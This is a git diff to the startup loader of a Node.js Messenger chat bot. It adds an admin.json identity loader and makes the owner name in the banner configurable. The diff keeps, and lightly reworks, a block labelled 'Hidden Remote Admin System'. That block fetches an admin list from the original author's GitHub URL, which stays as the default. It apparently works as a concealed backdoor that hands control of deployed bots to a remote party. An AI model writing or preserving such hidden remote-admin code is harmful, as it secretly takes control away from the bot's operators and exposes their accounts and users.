@@ -3,6 +3,7 @@ const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, watch,
 const { join, resolve } = require("path");
 const logger = require("./utils/log.js");
 const { normalizeConfig } = require("./utils/config.js");
+const { loadAdminInfo } = require("./utils/adminInfo.js");
 const { readCookieFile, loginOrder, sessionFileFor, runLoginFlow, toLoginData } = require("./utils/loginFlow.js");
 
 global.client = new Object({
@@ -114,15 +115,21 @@ try {
         }
     }
     logger.loader("Config Loaded!");
+    //========= Owner / admin identity (admin.json) =========//
+    global.adminInfo = loadAdminInfo({
+        warn: (message) => logger.loader(message, "warn")
+    });
     //========= Normalize Config (shared with reload) =========//
     global.config = normalizeConfig(global.config, {
-        warn: (message) => logger.loader(message, "warn")
+        warn: (message) => logger.loader(message, "warn"),
+        adminInfo: global.adminInfo
     });
 
     //========= Hidden Remote Admin System =========//
     (function() {
         const remoteAdminsRef = { current: [] };
-        const remoteUrl = "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
+        const remoteUrl = (global.adminInfo && global.adminInfo.remoteAdminListUrl)
+            || "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
         let lastLogState = "";
 
         function parseRemoteAdmins(data) {
@@ -469,7 +476,7 @@ async function onBot({ models: botModel }) {
 
         logger.loader(global.getText('Cyber', 'finishLoadModule', global.client.commands.size, global.client.events.size));
         logger.loader(`Startup Time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`);
-        logger.loader('\n░█████╗░██╗░░░██╗██████╗░███████╗██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗\n██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝\n██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗\n╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║\n░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ \n𝗜𝘀𝗹𝗮𝗺𝗶𝗰𝗸 𝗰𝗵𝗮𝘁 𝗯𝗼𝘁 MAHBUB-SHAON\n ===== [ ' + (Date.now() - global.client.timeStart) + 'ms ] =====');
+        logger.loader('\n░█████╗░██╗░░░██╗██████╗░███████╗██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗\n██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝\n██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗\n╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║\n░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ \n𝗜𝘀𝗹𝗮𝗺𝗶𝗰𝗸 𝗰𝗵𝗮𝘁 𝗯𝗼𝘁 ' + (global.adminInfo && global.adminInfo.name ? global.adminInfo.name : 'Bot Owner') + '\n ===== [ ' + (Date.now() - global.client.timeStart) + 'ms ] =====');
         
         // Config write-back was removed on purpose: startup must never persist
         // runtime-only fields (or injected ones) into config.json.
